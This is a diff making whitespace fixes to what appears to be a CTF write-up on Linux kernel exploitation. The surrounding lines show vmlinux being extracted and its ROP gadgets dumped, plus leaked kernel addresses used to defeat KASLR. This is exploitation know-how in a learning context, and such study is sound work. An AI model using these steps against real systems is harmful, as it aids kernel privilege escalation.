@@ -95,7 +95,9 @@ Now let's get the ROP gadgets, we need to extract vmlinux from vmlinux we need t
     ./extract-vmlinux vmlinuz > vmlinux
     chmod +x vmlinux
     ROPgadget --binary=vmlinux > gadgets.txt
+
 The vmlinux has like **THOUSANDS**  gadgets, i mean is the kernel image so it will run for several minutes, that's why we save them in a file for easy reference.
+
 
     ls -lah gadgets.txt 
     -rw-rw-r-- 1 ctf ctf 46M nov 18 16:01 gadgets.txt
@@ -129,7 +131,7 @@ As we saw earlier there is kaslr so we need to leak some stuff in this case Kern
  
  As result we get from last cycle
 
-     Cycle: 50 Idx: 0 Element: ffffffffa4ae21d0
+    Cycle: 50 Idx: 0 Element: ffffffffa4ae21d0
     Cycle: 50 Idx: 1 Element: 1f
     Cycle: 50 Idx: 2 Element: 184ded5d1f441700
     Cycle: 50 Idx: 3 Element: ffff931a06ca3f10
